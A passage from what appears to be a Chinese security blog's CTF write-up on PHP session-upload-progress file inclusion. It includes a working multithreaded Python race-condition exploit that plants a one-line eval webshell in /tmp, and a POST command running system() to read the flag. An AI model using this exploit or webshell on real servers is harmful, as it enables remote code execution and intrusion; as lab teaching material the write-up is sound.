+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.auto_start：如果 session.auto_start=On ，则PHP在接收请求的时候会自动初始化 Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为 off。此时用户是可以自己定义 Session ID 的。比如，我们在 Cookie 里设置 PHPSESSID=ph0ebus ，PHP 将会在服务器上创建一个文件：/tmp/sess_ph0ebus”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name 值组成，最后被写入 sess_ 文件里。</span><br><span class="line">session.save_path：负责 session 文件的存放位置，后面文件包含的时候需要知道恶意文件的位置，如果没有配置则不会生成session文件</span><br><span class="line">session.upload_progress_enabled：当这个配置为 On 时，代表 session.upload_progress 功能开始，如果这个选项关闭，则这个方法用不了</span><br><span class="line">session.upload_progress_cleanup：这个选项默认也是 On，也就是说当文件上传结束时，session 文件中有关上传进度的信息立马就会被删除掉；这里就给我们的操作造成了很大的困难，我们就只能使用条件竞争(Race Condition)的方式不停的发包，争取在它被删除掉之前就成功利用</span><br><span class="line">session.upload_progress_name：当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控</span><br><span class="line">session.upload_progress_prefix：它＋session.upload_progress_name 将表示为 session 中的键名</span><br></pre></td></tr></table></figure>
+<p>这里我们使用条件竞争+临时文件</p>
+<p>为什么要使用条件竞争呢？</p>
+<p>因为</p>
+<p><code>session.upload_progress.cleanup = On</code>（默认开启）</p>
+<p>这意味着上传完成后，session中关于上传进度的数据会被<strong>立即删除</strong>。</p>
+<p>如果我们在上传完成后再去包含session文件，恶意代码已经不存在了。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall <span class="keyword">as</span> re_findall</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;http://node4.anna.nssctf.cn:23312/&#x27;</span></span><br><span class="line">PHPINFO_URL = HOST + <span class="string">&#x27;phpinfo.php&#x27;</span></span><br><span class="line">LFI_URL = HOST + <span class="string">&#x27;index.php&#x27;</span></span><br><span class="line">WEB_SHELL = <span class="string">b&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session_configures = &#123;&#125;</span><br><span class="line">resp_text = re_findall(<span class="string">&#x27;&lt;td class=&quot;e&quot;&gt;session\.(.*?)&lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*?)&lt;/td&gt;&#x27;</span>, requests.get(PHPINFO_URL).text)</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : session_configures.update(&#123;x[<span class="number">0</span>] : x[<span class="number">1</span>]&#125;), resp_text))</span><br><span class="line"><span class="keyword">if</span> session_configures[<span class="string">&#x27;upload_progress.enabled&#x27;</span>] != <span class="string">&#x27;On&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Target is not vulnerable&#x27;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_phpinfo</span>():</span><br><span class="line">    exploit = <span class="string">f&quot;&lt;?php file_put_contents(&#x27;/tmp/.shell.php&#x27;, base64_decode(&#x27;<span class="subst">&#123;b64encode(WEB_SHELL).decode()&#125;</span>&#x27;)); echo md5(&#x27;ccc&#x27;);?&gt;&quot;</span></span><br><span class="line">    data = &#123;session_configures[<span class="string">&#x27;upload_progress.name&#x27;</span>] : exploit&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span> : <span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">    files = &#123;<span class="string">&#x27;files&#x27;</span> : (<span class="string">&#x27;hello.txt&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">1024</span> * <span class="number">1024</span>)&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        requests.post(PHPINFO_URL, data=data, cookies=cookies, files=files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_sess_file</span>():</span><br><span class="line">    <span class="keyword">global</span> success</span><br><span class="line">    data = &#123;<span class="string">&#x27;file&#x27;</span> : session_configures[<span class="string">&#x27;save_path&#x27;</span>] + <span class="string">&#x27;/sess_c&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        resp = requests.get(LFI_URL, params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;9df62e693988eb4e1e1444ece0578579&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] The webshell was successfully written to /tmp/.shell.php&#x27;</span>)</span><br><span class="line">            success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">Thread(target=request_phpinfo).start()</span><br><span class="line">Thread(target=request_sess_file).start()</span><br></pre></td></tr></table></figure>
+<p>该脚本的最终目的是通过一个进程持续写入恶意代码，另一个进程通过删除的时间差尝试读取并执行写入的恶意代码，从而打开后门</p>
+<p>运行后显示写入成功，于是用hackbar可以执行说明一句话木马写入成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:23312/?file=/tmp/.shell.php</span><br><span class="line">POST: cmd=system(&#x27;cd /;ls;cat nssctfasdasdflag&#x27;);</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app bin boot create_mysql_admin_user.sh dev etc home lib lib64 media mnt myrun.sh nssctfasdasdflag opt proc root run run.sh sbin srv start-apache2.sh start-mysqld.sh sys tmp usr var NSSCTF&#123;2a3c8175-c124-4c1f-8478-bf789c05f41c&#125; </span><br></pre></td></tr></table></figure>
+<p>或者使用蚁剑连接：？？？？？？（这个方法暂时还没真正解出来</p>
+<p>这里有个问题，为什么蚁剑直接连接找不到这个nssctfasdasdflag，用hackbar执行ls就能显示啊）蚁剑打开的根目录根本没有这玩意QAQ</p>
+<p>NSSCTF{2a3c8175-c124-4c1f-8478-bf789c05f41c}</p>
+
+    </div>
+    <footer class="article-footer">
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/08/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%88%A9%E7%94%A8/">https://cl1ck-t0.github.io/2026/08/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%88%A9%E7%94%A8/</a></p>
+    
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-08-20 12:11:47</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-08-20 12:13:17</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+        <div class="share-wrapper">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F08%2F20%2F%25E6%2596%2587%25E4%25BB%25B6%25E5%258C%2585%25E5%2590%25AB%25E6%25BC%258F%25E6%25B4%259E%25E8%25AF%25A6%25E8%25A7%25A3%25E5%258F%258A%25E5%2588%25A9%25E7%2594%25A8%2F&amp;appkey=&amp;title=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%88%A9%E7%94%A8&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="文件包含漏洞详解及利用">
+      <div class="share-icon icon icon-weibo">
+      </div>
+    </a>
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%88%A9%E7%94%A8&amp;desc=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%88%A9%E7%94%A8&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="文件包含漏洞详解及利用">
+      <div class="share-icon icon icon-qq">
+      </div>
+    </a>
+    <a href="javascript:;"  title="文件包含漏洞详解及利用">
+      <div class="share-icon icon icon-weixin">
+          <div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hexo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div>
+      </div>
+    </a>
+</div>
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag" title="web漏洞">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/149193615_p0_master1200.jpg" data-sizes="auto" alt="SSRF&amp;XXE漏洞" class="lazyload">
+        <a href="/2026/08/22/SSRF-XXE%E6%BC%8F%E6%B4%9E/" aria-label="Prev: SSRF&amp;XXE漏洞" title="Prev: SSRF&amp;XXE漏洞"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            SSRF&amp;XXE漏洞
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/hoshimi-miyabi-dope-3840x2160-20500.jpg" data-sizes="auto" alt="文件上传漏洞" class="lazyload">
+      <a href="/2026/08/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" aria-label="Next: 文件上传漏洞"  title="Next: 文件上传漏洞"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          文件上传漏洞
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        67.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:11
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> 文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.什么是文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#11-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.1.1.</span> <span class="toc-text"> 1.1 基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.2.</span> <span class="toc-text"> 1.2 为什么会存在文件包含漏洞？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2php-%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.PHP 中常见的文件包含函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#21-%E5%87%BD%E6%95%B0%E5%AF%B9%E6%AF%94"><span class="toc-number">1.1.2.1.</span> <span class="toc-text"> 2.1 函数对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#22-%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.2.2.</span> <span class="toc-text"> 2.2 执行原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.文件包含漏洞的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#31-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlfi-local-file-inclusion"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 3.1 本地文件包含（LFI - Local File Inclusion）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrfi-remote-file-inclusion"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 3.2 远程文件包含（RFI - Remote File Inclusion）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4lfi-%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.LFI 基础利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#41-%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 4.1 读取敏感文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#42-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86path-traversal"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 4.2 目录遍历（Path Traversal）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#43-%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.4.3.</span> <span class="toc-text"> 4.3 包含日志文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#44-php-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.4.</span> <span class="toc-text"> 4.4 PHP 伪协议利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.5.</span> <span class="toc-text"> 5.Session 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#51-session-%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.5.1.</span> <span class="toc-text"> 5.1 Session 文件基础知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#52-session-%E6%96%87%E4%BB%B6%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="toc-number">1.1.5.2.</span> <span class="toc-text"> 5.2 Session 文件命名规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#53-session-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.1.5.3.</span> <span class="toc-text"> 5.3 Session 文件内容格式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#54-%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6-session-%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.6.</span> <span class="toc-text"> 5.4 如何控制 Session 内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6session-upload-progress-%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.7.</span> <span class="toc-text"> 6.Session Upload Progress 详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#61-%E4%BB%80%E4%B9%88%E6%98%AF-session-upload-progress"><span class="toc-number">1.1.7.1.</span> <span class="toc-text"> 6.1 什么是 Session Upload Progress？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#62-%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.7.2.</span> <span class="toc-text"> 6.2 触发条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#63-%E5%86%99%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.7.3.</span> <span class="toc-text"> 6.3 写入过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64-session-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.7.4.</span> <span class="toc-text"> 6.4 Session 文件内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#65-%E8%87%AA%E5%8A%A8%E6%B8%85%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.7.5.</span> <span class="toc-text"> 6.5 自动清理机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89race-condition"><span class="toc-number">1.1.8.</span> <span class="toc-text"> 7.条件竞争（Race Condition）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#71-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.1.8.1.</span> <span class="toc-text"> 7.1 为什么需要条件竞争</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#72-%E7%AB%9E%E4%BA%89%E7%AD%96%E7%95%A5"><span class="toc-number">1.1.8.2.</span> <span class="toc-text"> 7.2 竞争策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#73-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.8.3.</span> <span class="toc-text"> 7.3 多线程实现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8lfi-rce%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.9.</span> <span class="toc-text"> 8.LFI -&gt; RCE（远程代码执行）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#81-%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF"><span class="toc-number">1.1.9.1.</span> <span class="toc-text"> 8.1 攻击链路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#82-%E5%B8%B8%E7%94%A8payload"><span class="toc-number">1.1.9.2.</span> <span class="toc-text"> 8.2 常用Payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.1.10.</span> <span class="toc-text"> 9.防御措施</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#91-%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="toc-number">1.1.10.1.</span> <span class="toc-text"> 9.1 代码层面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#92-%E9%85%8D%E7%BD%AE%E5%B1%82%E9%9D%A2"><span class="toc-number">1.1.10.2.</span> <span class="toc-text"> 9.2 配置层面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#93-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B1%82%E9%9D%A2"><span class="toc-number">1.1.10.3.</span> <span class="toc-text"> 9.3 服务器层面</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.11.</span> <span class="toc-text"> 10.总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%85%B8%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、典例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021easycleanup"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.[第五空间 2021]EasyCleanup</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+  
+<script src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>
+
+  
+<script src="/js/pjax.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha384-caMDqvgav&#x2F;HWdEYQU1QRRHMLleigpL1YHAG0m371DhzfL8rRzUyOb+bEHtwlmYjD" crossorigin="anonymous"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "文件包含漏洞详解及利用",
